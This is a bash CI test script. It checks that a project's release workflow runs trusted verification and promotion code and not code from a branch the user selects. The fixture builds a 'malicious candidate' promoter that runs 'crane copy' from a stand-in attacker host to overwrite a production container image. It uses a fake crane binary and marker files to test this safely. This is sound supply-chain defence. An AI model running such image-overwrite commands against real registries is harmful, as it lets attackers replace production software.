#!/usr/bin/env bash
set -euo pipefail

REPO_ROOT="$(cd "$(dirname "${BASH_SOURCE[0]}")/../.." && pwd)"
TEST_ROOT="$(mktemp -d)"
FIXTURE="$TEST_ROOT/repository"

cleanup() { rm -rf "$TEST_ROOT"; }
trap cleanup EXIT

ruby "$REPO_ROOT/scripts/ci/validate-workflow-contracts.rb" --root "$REPO_ROOT"

mkdir -p "$FIXTURE/scripts/ci" "$FIXTURE/scripts/release" "$FIXTURE/bin"
cp "$REPO_ROOT/scripts/ci/require-successful-ci-run.mjs" "$FIXTURE/scripts/ci/"
cp "$REPO_ROOT/scripts/release/promote-release-images.sh" "$FIXTURE/scripts/release/"
printf '#!/usr/bin/env bash\nprintf "%%s\\n" "$*" >> "$FAKE_CRANE_LOG"\n' \
  > "$FIXTURE/bin/crane"
chmod +x "$FIXTURE/bin/crane"

git -C "$FIXTURE" init -q -b main
git -C "$FIXTURE" config user.email test@evenfire.local
git -C "$FIXTURE" config user.name 'Evenfire Test'
git -C "$FIXTURE" add -A
git -C "$FIXTURE" commit -qm 'trusted workflow source'
trusted_sha="$(git -C "$FIXTURE" rev-parse HEAD)"

git -C "$FIXTURE" switch -qc malicious-candidate
cat > "$FIXTURE/scripts/ci/require-successful-ci-run.mjs" <<'MALICIOUS_HELPER'
import fs from 'node:fs'
fs.writeFileSync(process.env.MALICIOUS_HELPER_MARKER, 'candidate helper executed\n')
process.exit(0)
MALICIOUS_HELPER
cat > "$FIXTURE/scripts/release/promote-release-images.sh" <<'MALICIOUS_PROMOTER'
#!/usr/bin/env bash
set -euo pipefail
printf 'candidate promotion executed\n' > "$MALICIOUS_PROMOTION_MARKER"
crane copy attacker.invalid/source ghcr.io/evenfire-ai/control-api:compromised
MALICIOUS_PROMOTER
chmod +x "$FIXTURE/scripts/release/promote-release-images.sh"
git -C "$FIXTURE" add -A
git -C "$FIXTURE" commit -qm 'replace verifier and promoter'
candidate_sha="$(git -C "$FIXTURE" rev-parse HEAD)"

# Derive the executable ref from the real release workflow. The fixture does
# not choose the trusted SHA independently of the contract it is testing.
executable_ref="$(ruby "$REPO_ROOT/scripts/ci/validate-workflow-contracts.rb" \
  --root "$REPO_ROOT" \
  --resolve-release-executable-ref \
  --event workflow_dispatch \
  --workflow-sha "$trusted_sha" \
  --selected-ref malicious-candidate)"
tag_executable_ref="$(ruby "$REPO_ROOT/scripts/ci/validate-workflow-contracts.rb" \
  --root "$REPO_ROOT" \
  --resolve-release-executable-ref \
  --event push \
  --workflow-sha "$candidate_sha" \
  --selected-ref malicious-candidate)"
tag_executable_sha="$(git -C "$FIXTURE" rev-parse "$tag_executable_ref")"

if [ "$executable_ref" != "$trusted_sha" ] || \
   [ "$tag_executable_ref" != refs/heads/main ] || \
   [ "$tag_executable_sha" != "$trusted_sha" ]; then
  printf 'FAIL: honest workflow did not derive the trusted executable source\n' >&2
  exit 1
fi

git -C "$FIXTURE" switch -q --detach "$executable_ref"
helper_marker="$TEST_ROOT/malicious-helper-ran"
promotion_marker="$TEST_ROOT/malicious-promotion-ran"
crane_log="$TEST_ROOT/crane.log"

set +e
MALICIOUS_HELPER_MARKER="$helper_marker" node --input-type=module \
  - "$FIXTURE" "$candidate_sha" <<'NODE'
import { pathToFileURL } from 'node:url'

const [root, candidateSha] = process.argv.slice(2)
const helper = await import(pathToFileURL(`${root}/scripts/ci/require-successful-ci-run.mjs`))
let request = 0
const fakeFetch = async () => {
  request += 1
  return {
    ok: true,
    status: 200,
    async json() {
      return request === 1
        ? { id: 42, path: '.github/workflows/ci-public.yml' }
        : { workflow_runs: [] }
    },
  }
}

try {
  await helper.requireSuccessfulCiRun({
    allowedBranches: ['main'],
    fetchImpl: fakeFetch,
    repository: 'evenfire-ai/evenfire',
    sha: candidateSha,
    token: 'test-token',
  })
} catch (error) {
  console.error(error.message)
  process.exit(23)
}
NODE
provenance_status=$?
set -e

if [ "$provenance_status" -eq 0 ]; then
  printf 'FAIL: invalid candidate unexpectedly passed trusted provenance\n' >&2
  exit 1
fi

if [ -e "$helper_marker" ]; then
  printf 'FAIL: candidate provenance helper executed\n' >&2
  exit 1
fi

# The workflow's package-write job needs the failed provenance call, so this
# branch models GitHub's job reachability without contacting a registry.
if [ "$provenance_status" -eq 0 ]; then
  PATH="$FIXTURE/bin:$PATH" \
    FAKE_CRANE_LOG="$crane_log" \
    MALICIOUS_PROMOTION_MARKER="$promotion_marker" \
    bash "$FIXTURE/scripts/release/promote-release-images.sh"
fi

if [ -e "$promotion_marker" ] || [ -e "$crane_log" ]; then
  printf 'FAIL: failed provenance reached candidate promotion or crane\n' >&2
  exit 1
fi

if [ "$(git -C "$FIXTURE" rev-parse HEAD)" != "$trusted_sha" ]; then
  printf 'FAIL: selected candidate became the executable checkout\n' >&2
  exit 1
fi

printf 'PASS: trusted verifier rejected the candidate SHA\n'
printf 'PASS: malicious candidate helper never executed\n'
printf 'PASS: failed provenance kept promotion and fake crane unreachable\n'

# Mutate the production workflow contract, derive its executable ref through
# the same parser, and prove the fixture would execute candidate control code.
MUTATED_ROOT="$TEST_ROOT/candidate-first-workflow"
mkdir -p "$MUTATED_ROOT/.github"
cp -R "$REPO_ROOT/.github/workflows" "$MUTATED_ROOT/.github/"
perl -0pi -e \
  "s/github\.event_name == 'workflow_dispatch' && github\.workflow_sha \|\| 'refs\/heads\/main'/github.event.inputs.ref || github.workflow_sha || 'refs\/heads\/main'/" \
  "$MUTATED_ROOT/.github/workflows/release-images.yml"

if ruby "$REPO_ROOT/scripts/ci/validate-workflow-contracts.rb" --root "$MUTATED_ROOT" \
    >"$TEST_ROOT/candidate-first-validation.out" 2>&1; then
  printf 'FAIL: candidate-first workflow passed trusted-source validation\n' >&2
  exit 1
elif ! grep -Fq 'release executable checkout must ignore selected refs' \
    "$TEST_ROOT/candidate-first-validation.out"; then
  cat "$TEST_ROOT/candidate-first-validation.out" >&2
  printf 'FAIL: candidate-first workflow failed for the wrong reason\n' >&2
  exit 1
fi

mutated_executable_ref="$(ruby "$REPO_ROOT/scripts/ci/validate-workflow-contracts.rb" \
  --root "$MUTATED_ROOT" \
  --resolve-release-executable-ref \
  --event workflow_dispatch \
  --workflow-sha "$trusted_sha" \
  --selected-ref malicious-candidate)"
if [ "$mutated_executable_ref" != malicious-candidate ]; then
  printf 'FAIL: candidate-first fixture did not derive the selected candidate\n' >&2
  exit 1
fi

git -C "$FIXTURE" switch -q --detach "$mutated_executable_ref"
mutation_helper_marker="$TEST_ROOT/mutation-helper-ran"
mutation_promotion_marker="$TEST_ROOT/mutation-promotion-ran"
mutation_crane_log="$TEST_ROOT/mutation-crane.log"

MALICIOUS_HELPER_MARKER="$mutation_helper_marker" \
  node "$FIXTURE/scripts/ci/require-successful-ci-run.mjs"
PATH="$FIXTURE/bin:$PATH" \
  FAKE_CRANE_LOG="$mutation_crane_log" \
  MALICIOUS_PROMOTION_MARKER="$mutation_promotion_marker" \
  bash "$FIXTURE/scripts/release/promote-release-images.sh"

if [ ! -e "$mutation_helper_marker" ] || \
   [ ! -e "$mutation_promotion_marker" ] || \
   [ ! -e "$mutation_crane_log" ]; then
  printf 'FAIL: derived candidate checkout did not expose candidate control code\n' >&2
  exit 1
fi

printf 'PASS: honest workflow derives trusted dispatch and tag executable refs\n'
printf 'PASS: candidate-first mutation is rejected by the shared semantic authority\n'
printf 'PASS: mutated fixture derives and exposes malicious candidate control code\n'
